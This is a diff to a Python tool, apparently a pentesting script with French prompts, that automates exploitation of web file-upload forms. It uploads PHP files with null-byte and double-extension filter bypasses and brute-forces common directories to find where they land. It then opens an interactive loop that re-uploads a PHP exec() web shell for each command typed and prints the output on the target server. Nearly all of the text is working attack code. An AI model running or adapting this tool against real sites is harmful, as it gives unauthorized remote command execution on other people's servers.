@@ -3,6 +3,8 @@ import time
 import base64
 import argparse
 import re
+import readline
+from urllib.parse import urlparse
 
 # ============== PAYLOAD ============== #
 main_payload = r"""
@@ -39,24 +41,43 @@ parser.add_argument('-i', '--dirb', dest='dirb', default=None, help='Wordlist to
 args = parser.parse_args()
 
 #==========================FUNCTION=========================#
-def base_url(url):
-    return re.match(r'^(https?://[^/]+)', url).group(1)
+def get_base_dir(url):
+    p = urlparse(url)
+    path = p.path
+    if not path.endswith('/'):
+        path = path.rsplit('/', 1)[0] + '/'
+    return f"{p.scheme}://{p.netloc}{path}"
 
 def filename_variants(name):
-    return [name.split('%00')[0], name] if '%00' in name else [name]
+    if '%00' in name:
+        return [name, name.split('%00', 1)[0]]
+    return [name]
 
-def dirb(base, filename, wordlist):
-    with open(wordlist, 'r', errors='ignore') as f:
-        for line in f:
-            d = line.strip().strip('/')
-            print(d)
-            for fn in filename_variants(filename):
-                url = f"{base}/{d}/{fn}"
-                print(url)
-                r = requests.get(url)
-                if r.status_code == 200:
-                    print(f"[+] FOUND {url}")
-                    print(r.text[:300], "\n")
+def find_file_urls(target_url, filename, returned_path=None, wordlist=None):
+    urls = set()
+    base = get_base_dir(target_url)
+
+    if returned_path:
+        clean = returned_path.lstrip('./')
+        for fn in filename_variants(filename):
+            urls.add(base + clean.replace(filename, fn))
+
+    for fn in filename_variants(filename):
+        urls.add(base + fn)
+
+    common_dirs = ['upload', 'uploads', 'files', 'images', 'file', 'image', 'video', 'videos']
+    for d in common_dirs:
+        for fn in filename_variants(filename):
+            urls.add(base + d + '/' + fn)
+
+    if args.dirb:
+        with open(args.dirb, 'r', errors='ignore') as f:
+            for line in f:
+                d = line.strip().strip('/')
+                if d:
+                    for fn in filename_variants(filename):
+                        urls.add(base + d + '/' + fn)
+    return list(urls)
 
 def extract_vars(html):
     forms = re.findall(r"<form[\s\S]*?</form>", html, flags=re.IGNORECASE)
@@ -68,13 +89,10 @@ def extract_vars(html):
 
 def upload_file(url, field_name, payload, cookies=None, headers=None):
     content = payload["content"]
-    file_name = payload["file_name"]
-    mime = payload["mime"]
     if isinstance(content, str):
         content = content.encode()
-
-    files = {field_name: (file_name,content,mime)}
-    return requests.post(url,files=files,data={"submit": "OK"},cookies=cookies,headers=headers)
+    files = {field_name: (payload["file_name"], content, payload["mime"])}
+    return requests.post(url, files=files, data={"submit": "OK"}, cookies=cookies, headers=headers)
 
 def analyze_response(html):
     result = {"success": False, "error": None, "path": None}
@@ -88,41 +106,48 @@ def analyze_response(html):
     if path:
         result["success"] = True
         result["path"] = path.group(1)
-        return result
     return result
 
-#===============VAR===============#
-payloads = {
-    0: {"file_name": "sample.txt",
-        "mime": "text/plain",
-        "content": "Ceci est un test."},
-    1: {"file_name": "image.php%00.jpg",
-        "mime": "image/jpeg",
-        "content": b"\xff\xd8\xff\xe0"},
-    2: {"file_name": "image.php",
-        "mime": "application/php",
-        "content": "<?php echo 'ok'; ?>"}
-}
+def upload_and_analyze(url, field_name, payload, cookies=None, headers=None):
+    r = upload_file(url, field_name, payload, cookies, headers)
+    return analyze_response(r.text)
 
+def find_uploaded_file(target_url, payload, returned_path,
+                       cookies=None, headers=None, wordlist=None):
+    urls = find_file_urls(target_url, payload['file_name'], returned_path, wordlist)
+    for u in urls:
+        if '%00' in u:
+            continue
+        try:
+            r = requests.get(u, cookies=cookies, headers=headers, timeout=5)
+        except requests.RequestException:
+            continue
+        if r.status_code == 200:
+            print(f"[+] HIT -> {u}")
+            return r.text, u
+        elif r.status_code == 403:
+            print(f"[!] Permission denied -> {u}")
+    return None, None
+
+#===============PAYLOADS===============#
+payloads = {
+    0: {"file_name": "sample.txt", "mime": "text/plain", "content": "Ray manta upload"},
+    1: {"file_name": "image.php%00.jpg", "mime": "image/jpeg", "content": b"\xff\xd8\xff\xe0"},
+    2: {"file_name": "image.php", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    3: {"file_name": "image.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
+}
+succes = []
+#===============COOKIES + HEADERS===============#
 cookies = None
 headers = None
-succes = []
-
-#====================================OPTIONS====================================#
-
-print(main_payload)
 
 if args.cookie:
-    cookies = {}
-    for c in args.cookie.split(";"):
-        k, v = c.split("=", 1)
-        cookies[k.strip()] = v.strip()
+    cookies = dict(c.split("=", 1) for c in args.cookie.split(";"))
 
 if args.header:
-    headers = {}
-    for h in args.header.split(";"):
-        k, v = h.split(":", 1)
-        headers[k.strip()] = v.strip()
+    headers = dict(h.split(":", 1) for h in args.header.split(";"))
+#====================================OPTIONS====================================#
+print(main_payload)
 
 if args.url:
     print(f"[+] Target : {args.url}")
@@ -144,36 +169,42 @@ if args.url:
         field_name = vars[int(input("\nChoisir un numéro de payload : "))]
 
     if args.auto:
-        tests = payloads.keys()
+        test_payload = payloads.keys()
     else:
         print("\n[+] Payloads disponibles :")
         for idx in payloads:
             print(f"[{idx}] {payloads[idx]['file_name']}")
-        tests = [int(input("\n[+] Choisis le numéro du payload : "))]
+        test_payload = [int(input("\n[+] Choisis le numéro du payload : "))]
     print("\n[+] Lancement des tests...\n")
 
-    for idx in tests:
+    for idx in test_payload:
         payload = payloads[idx]
         print(f"[+] Upload '{payload['file_name']}' sur la variable '{field_name}'")
         if args.details:
             print(f"{payload}\n")
+        res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
 
-        r = upload_file(args.url, field_name, payload, cookies, headers)
-        res = analyze_response(r.text)
-
-        if res["success"]:
-            print(f"[+] SUCCESS -> {res['path']}")
-            succes = succes.append(idx)
-            if args.details:
-                print(f"{html}\n")
-            if args.dirb:
-                base = base_url(args.url)
-                dirb(base, payload['file_name'], args.dirb)
-
-        else:
+        if not res["success"]:
             print(f"[-] FAIL -> {res['error']}")
-            if args.details:
-                print(f"{html}\n")
+            continue
+
+        content, url = find_uploaded_file(args.url, payload, res["path"], cookies, headers, args.dirb)
+
+        if content == "Ray manta upload":
+            print("[+] EXPLOIT succes")
+
+            while True:
+                cmd = input("Commande à test : ")
+                payload["content"] = f"<?php exec('{cmd}', $r); var_dump($r);?>"
+
+                res = upload_and_analyze(args.url, field_name, payload, cookies, headers)
+                if not res["success"]:
+                    continue
+
+                content, _ = find_uploaded_file(args.url, payload, res["path"], cookies, headers, args.dirb)
+                if content:
+                    print(content)
+
     print("\n[+] Terminé")
     print(exit_payload)
 
